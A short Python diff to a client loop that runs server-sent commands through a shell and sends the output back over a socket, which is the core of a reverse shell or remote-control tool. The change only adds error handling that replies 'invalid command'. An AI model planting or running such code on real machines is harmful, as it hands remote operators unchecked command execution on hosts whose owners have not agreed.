@@ -19,6 +19,10 @@ while (run):
         print("SERVER DISCONNECTED")
         run = False
         break
-    result = subprocess.check_output(cmdlet, shell=True)
-    client.send(str(result).encode(FORMAT))
+
+    try:
+        result = subprocess.check_output(cmdlet, shell=True)
+        client.send(str(result).encode(FORMAT))
+    except:
+        client.send("invalid command".encode(FORMAT))
 client.close()
